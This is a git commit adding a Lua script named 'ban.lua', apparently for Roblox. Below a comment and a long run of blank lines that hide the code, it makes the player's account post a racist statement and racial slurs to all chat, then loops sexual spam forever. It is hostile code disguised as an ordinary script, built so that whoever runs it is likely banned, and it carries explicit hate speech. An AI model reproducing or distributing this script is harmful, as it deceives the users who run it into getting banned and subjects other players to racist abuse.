1298ce428b5043e70e00a7164e139e4215e293c0
Jarxay <99241070+Jarxay@users.noreply.github.com>
2022-04-19 22:22:42 +0200

    Create ban.lua

---
+++ ban.lua
@@ -0,0 +1,92 @@
+--SCRIPT
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local args1 = {
+    [1] = "I hate Black People",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args1))
+
+
+wait(0.1)
+
+local args2 = {
+    [1] = "Noiggoiiors",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args2))
+
+
+
+local args3 = {
+    [1] = "Nigger",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args3))
+
+
+wait(0.1)
+
+
+while true do
+    wait(0.2)
+	local args4 = {
+		[1] = "suck me",
+		[2] = "All"
+	}
+
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args4))
+	wait()
+	
+	wait(1)
+	local args5 = {
+		[1] = "give me the guap guap ",
+		[2] = "All"
+	}
+
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args5))
+	wait()
+end
